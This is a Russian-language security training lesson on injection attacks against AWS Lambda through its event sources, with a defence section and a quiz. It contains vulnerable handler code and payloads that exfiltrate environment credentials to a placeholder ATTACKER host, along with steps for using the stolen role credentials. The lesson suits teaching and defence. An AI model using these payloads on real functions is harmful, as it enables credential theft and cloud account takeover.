---
id: cloud-serverless-injection
title: "Serverless глубоко: инъекции в источники событий Lambda/SQS/API GW"
category: cloud
parent: cloud-serverless
difficulty: hard
order: 1
tags: [cloud, serverless, lambda, sqs, apigateway, injection, event-source]
prerequisites: [cloud-serverless, cloud-iam-basics]
useful_for:
  - "Атаки на serverless-приложения"
  - "Инъекции через источники событий"
  - "Bug bounty в бессерверных API"
estimated_minutes: 40
summary: "Глубокий разбор инъекций в serverless: command injection в Lambda, инъекции в SQS/SNS-сообщения, event-source mapping, API Gateway и десериализация. Как источники событий становятся векторами."
---
## Зачем этот урок

В serverless «вход» приложения — это не порт, а **событие** от источника: HTTP через API Gateway, сообщение из SQS/SNS, загрузка объекта в S3, изменение записи в DynamoDB Streams, событие EventBridge, вызов из другой функции. Каждый источник — потенциальная точка инъекции, потому что код функции часто собирает из события команду, SQL-запрос, путь к файлу или URL. Этот урок — про то, как источники событий становятся векторами RCE, SSRF и захвата роли функции.

## Модель угроз serverless

Четыре ключевых актива:
- **Код функции** — часто конкатенирует данные события в shell/запросы.
- **IAM-роль функции** — главный приз: её временные креды лежат в окружении.
- **Источники событий** — каналы доставки ввода (у каждого свои права на отправку).
- **Переменные окружения** — секреты, строки подключения, конфиги.

В отличие от классического сервера, вы не подключаетесь к функции по сети. Но если у вас есть право отправить событие в её источник (`sqs:SendMessage`, `s3:PutObject`, `sns:Publish`, `lambda:InvokeFunction`), вы доставляете ввод в функцию.

## Как читать конфигурацию функции

Перед атакой соберите всё о функции:

```bash
aws lambda get-function-configuration --function-name target --query '{Role:Role,Env:Environment.Variables,Handler:Handler,Runtime:Runtime,Timeout:Timeout}'
aws lambda get-policy --function-name target            # кто может её вызывать
aws lambda list-event-source-mappings --function-name target
aws iam get-role --role-name <LAMBDA_ROLE>
aws iam list-attached-role-policies --role-name <LAMBDA_ROLE>
aws iam list-role-policies --role-name <LAMBDA_ROLE>
```

`get-policy` показывает ресурсную политику (какие принципалы могут `InvokeFunction`), а `list-event-source-mappings` — какие очереди/стримы её триггерят.

## Инъекция 1: command injection в Lambda

Классика — функция вызывает shell с данными события:

```python
import subprocess
def handler(event, context):
    filename = event['queryStringParameters']['file']
    subprocess.call(f"convert /tmp/{filename} /tmp/out.png", shell=True)
```

Пейлоад в параметре `file`:

```
file=x; curl http://ATTACKER/$(cat /proc/self/environ | base64 -w0); #
```

Через API Gateway (URL-кодирование обязательно):

```bash
curl "https://api-id.execute-api.us-east-1.amazonaws.com/prod/convert?file=x%3B%20curl%20http://ATTACKER/%24(cat%20/proc/self/environ%7Cbase64%20-w0)%3B%20%23"
```

Признаки инъекции: наличие `shell=True`, `os.system`, `subprocess` с f-строкой, `Runtime=python3.x` и вызовы внешних бинарей.

## Инъекция 2: SQS/SNS-сообщения

Функция читает тело сообщения и использует его в опасном контексте:

```python
import os
def handler(event, context):
    for rec in event['Records']:
        os.system(f"echo {rec['body']} >> /tmp/log")
```

Пейлоад в теле сообщения:

```
; curl http://ATTACKER/$(env | base64 -w0) ; #
```

Особенность: функцию вы не видите напрямую, но если у вас есть `sqs:SendMessage` в очередь-источник — вы инжектируете. Проверьте права: `aws sqs get-queue-attributes`, `aws sqs list-queues`, затем отправьте сообщение:

```bash
aws sqs send-message --queue-url https://sqs.us-east-1.amazonaws.com/123/q --message-body '"; curl http://ATTACKER/$(env|base64); #"'
```

## Инъекция 3: S3-триггер

Lambda на загрузку в S3 часто использует **ключ объекта** в путях/командах:

```python
import subprocess
def handler(event, context):
    key = event['Records'][0]['s3']['object']['key']
    subprocess.call(f"ffmpeg -i s3://bucket/{key} /tmp/out.mp4", shell=True)
```

Имя объекта под вашим контролем. Загружаем объект с «злым» именем:

```
normal.mp4; curl http://ATTACKER/$(env|base64); #
```

```bash
curl -X PUT "https://bucket.s3.amazonaws.com/normal.mp4%3B%20curl%20http://ATTACKER/%24(env%7Cbase64)%3B%20%23" -d "x"
```

Ключи S3 URL-кодируются, но при декодировании в коде имя снова становится «грязным».

## Инъекция 4: API Gateway и request mapping

API Gateway может прокидывать параметры в Lambda в неожиданных форматах. Проверьте:
- **Path traversal** в проксирующих интеграциях `/{proxy+}` — путь события уходит в файловые операции.
- **Заголовки** (`X-Amz-...`, `X-Forwarded-For`) — влияют на логику авторизации и SSRF.
- **Множественные параметры** с одинаковым именем — WAF и валидатор видят одно значение, функция получает другое.
- **REST vs HTTP API** — у них разные контексты события; интеграция может «схлопывать» массив.

## Инъекция 5: десериализация

Serverless-функции иногда десериализуют данные: Python `pickle`, Java serialization, YAML `!!python/object`, JSON с полиморфизмом (Jackson). Если источник события под вашим контролем (SQS, S3, прямой invoke) — классический deserialization RCE. Ищите `pickle.loads`, `yaml.load` без `SafeLoader`, `ObjectInputStream.readObject`.

## Разобранный пример: S3-триггер → захват роли

1. Находим бакет с загрузкой (публичная запись или через приложение) и Lambda-триггер на него.
2. Загружаем объект с инъекцией в имени (см. выше).
3. Lambda реагирует, выполняет shell, отправляет env на listener.
4. В env — `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` **роли функции**.
5. Используем креды:

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws lambda list-functions
aws s3 ls
```

## Захват и эскалация роли функции

Роль функции — приз. Смотрим, что она умеет:

```bash
aws iam get-role --role-name <LAMBDA_ROLE>
aws iam list-attached-role-policies --role-name <LAMBDA_ROLE>
aws iam list-role-policies --role-name <LAMBDA_ROLE>
aws iam get-policy-version --policy-arn <ARN> --version-id v1
```

Если роль имеет `iam:PassRole` + `lambda:UpdateFunctionConfiguration`/`lambda:CreateFunction` — можно привязать к функции более привилегированную роль и вызвать её (см. `cloud-lambda-privesc`). Если `lambda:UpdateFunctionCode` — залить свой код.

## Защита

- Не использовать shell с пользовательским вводом; передавать аргументы списком, а не строкой.
- Валидировать события по схеме (API Gateway request validation, JSON Schema).
- Минимальные роли функций; запрет `*` в ресурсах.
- Секреты — в Secrets Manager/Parameter Store, не в env.
- Ограничивать `sqs:SendMessage`/`s3:PutObject`/`lambda:InvokeFunction` доверенными принципалами.
- Включать `Reserved Concurrency` и логировать `Invoke` через CloudTrail data events.

## Частые ошибки

- **Считать, что serverless неинжектируем.** Инъекции живут в коде и в источниках.
- **Не искать источники событий.** SQS/S3/DynamoDB-триггеры — тоже вход.
- **Игнорировать имена объектов.** Ключ S3 часто попадает в команды.
- **Не читать env после RCE.** Там временные креды роли функции.
- **Забыть про десериализацию.** `pickle.loads` в Lambda — реальный RCE.

## Что делать дальше / решение

Практика: разверните функцию с S3-триггером и `subprocess`-вызовом, залейте объект с инъекцией, добудьте креды роли, затем прочитайте её политики. Дальше переходите к `cloud-lambda-privesc` (эскалация через `PassRole`) и `cloud-metadata-ssrf` (если функция ходит по URL из события).

## DynamoDB Streams, EventBridge и Kinesis

Источники событий не ограничиваются SQS/S3:
- **DynamoDB Streams** — функция читает `NewImage`/`OldImage` записи. Если поля записи попадают в команду или запрос — инъекция. Право на запись в таблицу (`dynamodb:PutItem`) даёт контроль над содержимым события.
- **EventBridge** — поле `detail` под вашим контролем, если есть `events:PutEvents`.
- **Kinesis** — тело записи (base64) декодируется в коде; `kinesis:PutRecord` даёт инъекцию.
- **SNS** — подписка на топик; `sns:Publish` даёт контроль над `Message`.

Общий принцип: любой источник, в который вы можете писать, — это вход в функцию.

## Разведка serverless-периметра

```bash
aws lambda list-functions --query 'Functions[].FunctionName'
aws apigateway get-rest-apis
aws apigatewayv2 get-apis
aws sqs list-queues
aws sns list-topics
aws s3api list-buckets
aws events list-rules
```

Сопоставьте функции с их `Role` и `Environment`. Функции с широкими ролями — приоритет.

## Отладка и подтверждение инъекции

Если инъекция «слепая» (нет вывода), используйте OOB-канал: `curl`/`dig` на ваш listener, DNS-эксфильтрацию через поддомены. Для command injection с задержкой — `sleep`. Проверяйте наличие `shell=True`/`os.system` в коде функции: при наличии `lambda:GetFunction` скачайте пакет и распакуйте его.

```bash
aws lambda get-function --function-name target --query 'Code.Location' --output text
curl -o fn.zip "<presigned-url>" && unzip fn.zip -d fn && grep -rn "os.system\|shell=True\|subprocess\|pickle" fn/
```

## Почему роль функции — главный приз

Временные креды роли в env живут до ~12 часов и действуют на всё, что разрешено её политикой: чтение других бакетов, вызов других функций, доступ к секретам, иногда `sts:AssumeRole` в другие аккаунты. Это делает один RCE в Lambda полноценным фoothold в аккаунте.

## Ограничения и обходы

- **Маскирование** секретов в CloudWatch Logs обходится кодированием (base64/hex).
- **VPC-функции** без NAT не имеют egress — используйте DNS-эксфильтрацию или загрузку в S3.
- **Валидация схемы** API Gateway обходится дублированием параметров или заголовками.
- **Timeout функции** ограничивает длинные команды — используйте фоновый процесс и быстрый ответ.

## Квиз

```quiz
- question: "Почему имя S3-объекта может привести к RCE в Lambda-триггере?"
  options:
    - "S3 шифрует имена"
    - "Код часто подставляет ключ объекта в shell-команду без экранирования"
    - "Lambda не читает ключи"
    - "Имя объекта нельзя контролировать"
  answer: 1
  explanation: "Ключ объекта попадает в команду — инъекция через имя файла."
- question: "Где в serverless-функции хранятся креды её IAM-роли?"
  options:
    - "В /etc/passwd"
    - "В переменных окружения (AWS_ACCESS_KEY_ID и др.)"
    - "В DNS"
    - "В Route 53"
  answer: 1
  explanation: "Lambda прокидывает временные креды роли в окружение функции."
- question: "Какой источник событий можно использовать для инъекции, имея право sqs:SendMessage?"
  options:
    - "S3"
    - "SQS-очередь, на которую подписана функция"
    - "Route 53"
    - "CloudFront"
  answer: 1
  explanation: "Отправив сообщение в очередь-источник, вы доставляете ввод в функцию."
- question: "Что делать сразу после RCE в Lambda для доступа к роли?"
  options:
    - "Удалить функцию"
    - "Считать переменные окружения и использовать креды роли"
    - "Перезапустить функцию"
    - "Изменить регион"
  answer: 1
  explanation: "Env содержит временные креды роли функции."
- question: "Какой класс уязвимостей в serverless связан с pickle/Java serialization?"
  options:
    - "XSS"
    - "Десериализация, ведущая к RCE"
    - "SQL-инъекция"
    - "CSRF"
  answer: 1
  explanation: "Небезопасная десериализация данных из события — прямой RCE."
```

## Где пригодится

- **Bug bounty** — serverless API и обработчики событий.
- **Пентест** — атаки на бессерверные приложения.
- **Red team** — от инъекции к роли функции.
- **IR/Blue team** — детект аномальных вызовов Lambda.
- **DevSecOps** — безопасные паттерны обработки событий.
